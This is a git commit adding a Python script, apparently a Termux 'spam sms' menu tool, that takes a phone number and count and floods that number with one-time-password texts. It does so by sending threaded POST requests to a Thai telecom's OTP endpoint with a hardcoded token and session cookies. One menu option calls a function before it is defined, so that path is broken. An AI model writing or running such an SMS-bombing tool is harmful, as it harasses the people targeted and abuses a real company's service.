2d450696d763ec8e5e8acbfa84363defa3271acd
NAT <99189669+NatHack001@users.noreply.github.com>
2022-04-16 15:35:23 +0700

    Add files via upload

---
+++ bate01.py
@@ -0,0 +1,97 @@
+import requests,json
+import threading
+import colorama
+import os
+import requests
+import time
+from requests import get
+from re import search
+from requests import Session
+from threading import Thread
+
+os.system('clear')
+print('')
+print('\033[91m██╗███╗   ██╗███████╗████████╗ █████╗ ██╗     ██╗')
+print('██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║     ██║')
+print('██║██╔██╗ ██║███████╗   ██║   ███████║██║     ██║')
+print('██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║     ██║')
+print('██║██║ ╚████║███████║   ██║   ██║  ██║███████╗███████╗')
+print('╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝')
+print('')
+print('\033[1;94mDiscord : \033[92mHACK_N007 #5531 \033[91m[\033[1;96mCode\033[91m]')
+print('\033[91mYouTube : \033[92mERROR INSTALL NH \033[91m[\033[1;96mCode\033[91m]')
+print('\033[1;96mTikTok : \033[92m@error_hack_n \033[91m[\033[1;96mCode\033[91m]')
+print('')
+print('======================================================')
+print('')
+print('[\033[1;96m1\033[91m]\033[95m spam sms01  \033[91m[\033[1;96mERROR\033[91m]   [\033[1;96m5\033[91m] \033[95mYoutube ERROR INSTALL NH')
+time.sleep(0.1)
+print('[\033[1;96m2\033[91m]\033[95m Credit01              \033[91m[\033[1;96m6\033[91m] \033[95mYoutube EH4404')
+time.sleep(0.1)
+print('\033[91m[\033[1;96m3\033[91m]\033[95m Credit02  ')
+time.sleep(0.1)
+print('\033[91m[\033[1;96m4\033[91m]\033[95m spam sms02 \033[91m[\033[1;96mNew!\033[91m]  ')
+print('')
+time.sleep(0.1)
+print('\033[91m[\033[1;96m00\033[91m] Exit ')
+print('')
+print('======================================================')
+print('')
+earth = input('\033[1;96mNumber : \033[92m ')
+time.sleep(0.5)
+
+if earth == '1':
+    print('free spam sms! ')
+    print('')
+    phone = input('phone : ')
+    num = int(input('num : '))
+ 
+    for i in range(num):
+        threading.Thread(target=api).start()
+        
+if earth == '2':
+    print('')
+    print('\033[1;96mโครงจัดทำโดย \033[92mERROR INSTALL')
+    print('')
+    
+if earth == '3':
+    print('\033[1;96mโครงจัดทำโดย \033[92mCYBER SAFE')
+    print('')
+    
+if earth == '4':
+    print('spam sms by ERROR INSTALL')
+    #กันพิสาสส
+    print('')
+    phone = input('phone : ')
+    print('')
+    num = int(input('num : '))
+    print('')
+
+    def api():
+        requests.post("https://gamingnation.dtac.co.th/api/otp/request",json={"template":"register","phone_no":phone,"token":"03AGdBq257kzKUMJ1ob4zTwDWOVXpLdk4FcMHa_nwlf3xt816SvNfzramnqWTE-yrfjWuQHjNlBrgAZlqspYl-5EH6anY7qorOpa_OmjqLK0TeTajlqAeJLh-jd3QfJyjKbPT1ralDApTC5PHpdGVMQ2sdbX3GKPjpGy2-9r27Kgd8ZF2JUuTgrNIS3ljBDYjuAqt6Rbn0me7ikEd0Ns7a3VXL5Gs8UkiOojLgFh5WK8J80zymilWxqkVQX0-KI_NaDcZKDuWwMHzs2-W68U8qbUUb4B0kNfzwfH9PcftDbdbCPZ43ZcWF2xepsvXhIXIipMawBK3H6fvwmUa1G9_-5I9c-DuPnTi7gq27SV12i4uxwwlpzNpNnofPmZ8vOv9tzxgoHCWkCbMgJVPYRl-PogXqpZBLhXHawb2FGxx--OjKuraWRLRg1-nC-ZK0_xcOCTqjCad-dDyP49aC2BWRlJd8VhskCzH0S4B-I6lRg78qSWV3mQ1vbNrsp_Xk3pjfiilZqznCkPLN29vpVezJIyweRKYTMFlV1Q"},headers={"User-Agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36","Cookie":"i18n_redirected=th; _gcl_au=1.1.1259613914.1645770250; _fbp=fb.2.1645770253711.1894109895; _hjSessionUser_2510409=eyJpZCI6IjY1NDUxZTZiLTMxNDYtNWY2NS1iZTI5LTJlYTg2YTUxZWRiMiIsImNyZWF0ZWQiOjE2NDU3NzAyNTM1NTUsImV4aXN0aW5nIjp0cnVlfQ==; v10DeviceID=76d43cf572c2921a5fb598a66248e158; v10UA=DTAC%2F10.0%2Fweb%2F1.0%2FNetworkType%2F76d43cf572c2921a5fb598a66248e158%2FM2006C3LG-Chrome; fromApp=dtacLite; v10Lang=th; OptanonAlertBoxClosed=2022-02-25T06:31:00.287Z; _hjSessionUser_1100693=eyJpZCI6ImUzMWM2NjcyLTBjMzAtNTIxZC05ZDdiLTFlNjg3NTc4ZjkxZSIsImNyZWF0ZWQiOjE2NDU3NzA2ODE3NTUsImV4aXN0aW5nIjp0cnVlfQ==; _ga=GA1.3.176519351.1645770253; OptanonConsent=isIABGlobal=false&datestamp=Fri+Feb+25+2022+13%3A33%3A21+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.15.0&hosts=&consentId=cd42bf1d-c1ac-4a3f-b20c-54d16145aa24&interactionCount=2&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0004%3A1&geolocation=TH%3B84&AwaitingReconsent=false; cto_bundle=2wShxV91OFdyc3NvNVQ5TUZ3VFZzM0JkOWlQSFMxZU8xMXF2Y3VxR1RWJTJGOTcySkVCU3VqZ09haVByaHVNT3hjQTY0VUQyTHF6WXhVMEl0Um1KUDZVTFh3JTJGdWxOck9VZ1U3aDNVYVBJVyUyQnB3dXAwWThlR2tvMnh1WlRTWlRjU3hscGxaZkxkJTJGWUhXeVI4dUJHb2MwcnNiNXVyQSUzRCUzRA; _ga_EGFFCDXTW2=GS1.1.1645770681.1.1.1645770804.0; _gid=GA1.3.1993109359.1647399772; auth.strategy=local; _gat_UA-16732483-1=1; _hjIncludedInSessionSample=0; _hjSession_2510409=eyJpZCI6IjIyNGE1NzFlLTdhOTUtNDMzNC1iMjE2LWVhNjc5YzIwNjA4MSIsImNyZWF0ZWQiOjE2NDc0MDY0NzAyOTAsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0"})
+        print('attack sms')
+
+    for i in range(num):
+        threading.Thread(target=api).start()
+
+if earth == '00':
+	print('')
+	os.system('clear')
+	print('รอสักครู่...')
+	time.sleep(1)
+	print ("กำลังออกจากระบบ...")
+	time.sleep(5)
+	print('')
+	exit()
+    
+if earth == '5':
+    os.system('clear')
+    print('กำลังเข้า YouTube..')
+    time.sleep(2)
+    os.system('termux-open-url https://www.youtube.com/channel/UCta4-mHclTwPVHgSvyf7Fkg/featured')
+    
+if earth == '6':
+    os.system('clear')
+    print('กำลังเข้า YouTube..')
+    time.sleep(2)
+    os.system('termux-open-url https://www.youtube.com/channel/UCdaBhAIBlxdg1_8D0mfB1SA/channels')
